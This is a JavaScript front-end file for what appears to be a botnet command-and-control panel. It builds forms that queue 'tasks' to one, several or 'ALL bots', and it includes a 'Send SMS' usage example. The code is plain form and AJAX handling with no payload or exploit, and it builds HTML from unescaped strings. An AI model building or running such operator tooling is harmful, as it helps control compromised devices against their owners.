
// on off
function msg_cmd_select(cmd_on, cmd_off) {
	
	close_msg_box()
	hide_command_form()
	
	var data = commands_data[cmd_on.substring(4)]
	
	$('#msg-confirm-title').html(data['name'])
	$('#message-box-confirm-descr').html(data['descr'] + '<br /><i style="font-size: 11pt">Press Escape to cancel</i>')
	
	$('#message-box-confirm-left').html('Disable')
	$('#message-box-confirm-right').html('Enable')
	
	set_enter_hook(null, close_msg_box) 
	
	$('#message-box-confirm-left').click(function (){ close_msg_box(); show_ajax_form(cmd_off) })
	$('#message-box-confirm-right').click(function (){ close_msg_box(); show_ajax_form(cmd_on) })
	
	$('#message-box-confirm').fadeIn()
}

// show command form; form will be send to ajax.php
function show_ajax_form(cmd, bots)
{
	var bots = (bots === undefined)? [] : bots // can be ['ALL']

	// FORMAT
	// input name, input readable name, pop-up help text, placeholder, field is required (bool)
	if(!bots.length)
	{
		if('bot' == core_context.content)
			bots = [core_context.bot_id]
		else// if('bots' == core_context.content)
			bots = get_selected_elems()
	}
	
	if(!bots.length)
	{
		msg_confirm('No records selected. Do you want to select all filtered records?', show_ajax_form, [cmd, ['ALL']])
		return
	}
	
	var title = ''
	var descr = ''
	var fields = {}
	var extras = {}
	
	var cmd_type = (cmd.substring(0, 4) == 'bot_')? 'bot' : 'panel'
	
	if(cmd_type == 'bot')
	{
		var cmd_text = cmd.substring(4) 
		var command_details = commands_data[cmd_text]
		title = command_details['name']
		descr = command_details['descr']
		fields = command_details['fields']
		
	}else{
		
		var cmd_panel = cmd.substring(6)
		title = panel_commands_data[cmd_panel]['name'] // Error? You must register command in commands.php $cmd_panel
		descr = panel_commands_data[cmd_panel]['descr']
	}
	
	extras = {
		'cmd': cmd,
		'records': bots,
		'context': core_context.content,
	}

	content = generate_form(cmd_type, title, descr, fields, extras)

	$('#command_form').html(content)
	$('#command_form').show()
	if(fields.length)
		$('#ajax-form-' + fields[0][0]).focus()
	
	set_enter_hook(send_command_form, hide_command_form)
	return undefined
}

function hide_command_form()
{
	clean_enter_hook()
	$('#command_form').fadeOut()
}

function show_loader(param)
{
	if(!param)
	{
		$('#refreshButton').show()
		$('#loader-div').hide()
	}else{
		$('#refreshButton').hide()
		$('#loader-div').show()
	}
}

// create html 
function generate_form(cmd_type, title, descr, fields, extras)
{
	//~ Usage example:
	//~ var fields = [
		//~ ['number', 'Phone number', 'Help', '3155500000'],
		//~ ['text', 'Text', '', 'Hello!'],
	//~ ]
	//~ 
	//~ content = generate_form('bot', 'Send SMS', fields, {'bot_id': core_context.botid})

	var base = $('#command_form_template').html()
	base = base.replace('%TITLE%', title).replace('%DESCR%', descr)
	
	form = ''
	for(i in fields)
	{
		elem = fields[i]
		//~ console.log(elem)
		name = elem[0]
		title = elem[1]
		help = elem[2]
		placeholder = elem[3]
		required = (elem[4] === true)? ' required ' : ''

		if(elem[5] == 'textarea')
		{
			field_html = "<textarea rows='5' "+required+" class='form-control' id='ajax-form-"+name+"' placeholder='"+placeholder+"'></textarea>"
		}else{
			field_html = "<input type='text' "+required+" class='form-control' id='ajax-form-"+name+"' placeholder='"+placeholder+"' />"
		}
		
		var help_icon = (help)? "&nbsp;&nbsp;&nbsp;<a href='javascript:undefined' data-toggle='tooltip' tabindex='-1' title='"+help+"'><span class='glyphicon glyphicon-info-sign' aria-hidden='true'></span></a>" : ''
		
		piece = "<div class='row' style='margin-bottom: 10px'>" +
				"<div class='col-md-4'>" +
					title + help_icon +
				"</div>" +
				"<div class='col-md-8'>"+field_html+"</div>" +
			"</div>"
			
		form += piece
	}
	
	for(key in extras)
	{
		var val = extras[key]
		if(val.constructor.name == 'Array')
			val = val.join(',')
			
		form += "<input type='hidden' id='ajax-extra-"+key+"' value='"+val+"' />"
	}
	
	var set_button_text = 'Set task'
	var set_button_class = 'btn-info'
	
	if('bots' in extras)
	{
		//~ console.log(extras['bots'])
		if(extras['bots'].length == 1 && extras['bots'][0] == 'ALL')
		{
			set_button_text += ' to ALL bots'
			set_button_class = 'btn-warning'
		}else if(extras['bots'].length > 1){
			set_button_text += ' to '+extras['bots'].length+' bots'
		}else{
			set_button_text += ' to bot'
		}
	}
	
	if(cmd_type == 'panel')
		set_button_text = 'OK'
		
	base = base.replace('%FORM%', form).replace('%SET_BUTTON_TEXT%', set_button_text).replace('%SET_BUTTON_CLASS%', set_button_class)
	return base
}

// send ajax request, close form
function send_command_form()
{
	// validator
	break_form_send = false
	first_failed = undefined
	
	data = {'bot_params': {} } // params directly to bot
	
	// params to bot
	var elems = $('[id^="ajax-form-"]')
	for(var i = 0; i < elems.length; i++)
	{
		var elem = elems[i]
		
		$(elem).removeClass('inputError')
		
		var id = $(elem).prop('id').replace('ajax-form-', '')
		var val = $(elem).val()
		
		if($(elem).prop('required') === true && val == '')
		{
			//~ msg('Error', 'Field can not be empty');
			$(elem).addClass('inputError')
			break_form_send = true
			// save first failed to focus it later
			if(first_failed === undefined)
				first_failed = elem
		}
		
		data['bot_params'][id] = val
	}
	
	// bot id, etc
	$('[id^="ajax-extra-"]').each(function(i, elem){ 
		var id = $(elem).prop('id').replace('ajax-extra-', '')
		var val = $(elem).val()
		data[id] = val
	})
	
	if(break_form_send)
	{
		setTimeout(function(){ $(first_failed).focus() }, 1000)
		return
	}
	
	// add filter values if records=ALL
	if(data.records !== undefined && data.records == 'ALL')
	{

		var elems = get_filter_values()
		for(var elem in elems)
		{
			if(elem.indexOf('-filter-') > -1)
			{
				var parts = elem.split('-filter-')
				data['filter['+parts[1]+']'] = elems[elem]
			}
		}
	}
	ajax_dialog(data, hide_command_form)
} 

function logout()
{
	$('#msg-confirm-title').html('Logout?')
	$('#message-box-confirm-descr').html('')
	
	$('#message-box-confirm-left').html('Cancel')
	$('#message-box-confirm-right').html('Logout')
	
	function logout_confirmed(){ 
		close_msg_box(); 

		for(val in $.cookie())  
			$.removeCookie(val)
		
		location.reload()
	}
	
	set_enter_hook(logout_confirmed, close_msg_box) 
	
	$('#message-box-confirm-left').click(function (){ close_msg_box(); })
	$('#message-box-confirm-right').click(logout_confirmed)
	
	$('#message-box-confirm').fadeIn()
}











